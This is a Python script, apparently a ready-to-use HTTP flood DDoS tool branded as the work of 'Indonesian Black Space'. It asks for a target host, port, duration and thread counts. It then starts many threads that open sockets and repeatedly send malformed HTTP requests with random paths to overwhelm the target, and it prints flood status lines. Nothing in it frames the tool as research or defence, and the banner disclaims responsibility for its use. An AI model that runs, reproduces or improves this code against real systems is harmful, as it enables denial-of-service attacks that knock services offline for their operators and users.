from lib import *
from main import *
def status_print(ip,port,thread_id,rps,path_get):
        print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP{Fore.WHITE} {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, int(num)))
        return data
def generate_url_path_choice(num):
        letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
        data = ""
        for _ in range(int(num)):
            data += random.choice(letter)
        return data
def attack_mek(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
        rps = 0
        url_path = ''
        path_get = ['PY_FLOOD','CHOICES_FLOOD']
        path_get_loader = random.choice((path_get))
        if path_get_loader == "PY_FLOOD":
            url_path = generate_url_path_pyflooder(5)
        else:
            url_path = generate_url_path_choice(5)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
            elif data_type_loader_packet == 'OWN1':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
            elif data_type_loader_packet == 'OWN2':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
            elif data_type_loader_packet == 'OWN3':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
            elif data_type_loader_packet == 'OWN4':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
            elif data_type_loader_packet == 'OWN5':
                packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
            s.connect((ip,port))
            for _ in range(booter_sent):
                s.sendall(packet_data)
                s.send(packet_data)
                rps += 2
        except:
            try:
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            except:
                pass
        status_print(ip,port,id,rps,path_get_loader)
status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
        global status_code,id_loader
        if status_code == True:
            while time.time() < time_loader:
                for _ in range(spam_loader):
                    id_loader += 1
                    th = threading.Thread(target=attack_mek,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                    th.start()
                    th = threading.Thread(target=attack_mek,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                    th.start()
                    th = threading.Thread(target=attack_mek,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                    th.start()
                    th = threading.Thread(target=attack_mek,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                    th.start()
                    th = threading.Thread(target=attack_mek,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                    th.start()
        else:
            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
banner = f"""
{space}{space}{space}{Fore.RED}╔╗ ┬  ┌─┐┌─┐┬┌─  ╔╦╗┌─┐┌─┐┬  ┌─┐
{space}{space}{space}{Fore.RED}╠╩╗│  ├─┤│  ├┴┐   ║ │ ││ ││  └─┐
{space}{space}{space}{Fore.RED}╚═╝┴─┘┴ ┴└─┘┴ ┴   ╩ └─┘└─┘┴─┘└─┘\n 
{space}{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{space}{Fore.CYAN}║ # DDOS TOOLS BY INDONESIAN BLACK SPACE                    ║
{space}{Fore.CYAN}╠═══════════════════════════════════════════════════════════╣
{space}{Fore.CYAN}║ # Developer Tidak Bertanggung jawab atas kegiatan anda!!  ║
{space}{Fore.CYAN}║ # DDOS simple By Black Space @ ClownFake                  ║
{space}{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝\n
"""
print(banner)
host = "" 
ip = ""
print(f"""
{space}{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{space}{Fore.CYAN}║ # OPTION TYPE DDOS                                        ║
{space}{Fore.CYAN}╠═══════════════════════════════════════════════════════════╣
{space}{Fore.CYAN}║ # PYF                                                     ║
{space}{Fore.CYAN}║ # OWN1                                                    ║
{space}{Fore.CYAN}║ # OWN2                                                    ║
{space}{Fore.CYAN}║ # OWN3                                                    ║
{space}{Fore.CYAN}║ # OWN4                                                    ║
{space}{Fore.CYAN}║ # OWN5                                                    ║
{space}{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝\n
""")
data_type_loader_packet = input(warna("┌──(Black@Indonesian)-[TYPE]\n└─# ", Fore.LIGHTGREEN_EX)).upper()
target_loader = input(warna("┌──(Black@Indonesian)-[IP/URL]\n└─# ", Fore.LIGHTGREEN_EX))
port_loader = int(input(warna("┌──(Black@Indonesian)-[PORT=80]\n└─# ", Fore.LIGHTGREEN_EX)))
time_loader = time.time() + int(input(warna("┌──(Black@Indonesian)-[TIME=250]\n└─# ", Fore.LIGHTGREEN_EX)))
spam_loader = int(input(warna("┌──(Black@Indonesian)-[SPAM=500]\n└─# ", Fore.LIGHTGREEN_EX)))
create_thread = int(input(warna("┌──(Black@Indonesian)-[THREADS=15]\n└─# ", Fore.LIGHTGREEN_EX)))
booter_sent = int(input(warna("┌──(Black@Indonesian)-[SENT=500]\n└─# ", Fore.LIGHTGREEN_EX)))
print(f"""
{space}{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗
{space}{Fore.CYAN}║ # OPTION METHOD DDOS                                      ║
{space}{Fore.CYAN}╠═══════════════════════════════════════════════════════════╣
{space}{Fore.CYAN}║ # CONNECT                                                 ║
{space}{Fore.CYAN}║ # GET                                                     ║
{space}{Fore.CYAN}║ # PUT                                                     ║
{space}{Fore.CYAN}║ # PATCH                                                   ║
{space}{Fore.CYAN}║ # POST                                                    ║
{space}{Fore.CYAN}║ # HEAD                                                    ║
{space}{Fore.CYAN}║ # DELETE                                                  ║
{space}{Fore.CYAN}║ # OPTIONS                                                 ║
{space}{Fore.CYAN}║ # TRACE                                                   ║
{space}{Fore.CYAN}║ # PANOS                                                   ║
{space}{Fore.CYAN}║ # MIRAI                                                   ║
{space}{Fore.CYAN}║ # EXPLOITS                                                ║
{space}{Fore.CYAN}║ # LOGSHELL                                                ║
{space}{Fore.CYAN}║ # SERVER                                                  ║
{space}{Fore.CYAN}║ # CLOUDFLARE                                              ║
{space}{Fore.CYAN}║ # AGE                                                     ║
{space}{Fore.CYAN}║ # PYFLOODER                                               ║
{space}{Fore.CYAN}║ # GATEAWAY                                                ║
{space}{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝\n
""")
methods_loader = input(warna("┌──(Black@Indonesian)-[METHOD]\n└─# ", Fore.LIGHTGREEN_EX)).upper()
spam_create_thread = int(input(warna("┌──(Black@Indonesian)-[SPAM THREADS=15]\n└─# ", Fore.LIGHTGREEN_EX)))
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
        ip = socket.gethostbyname(host)
except socket.gaierror:
        exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
        
    for _ in range(spam_create_thread):
            threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
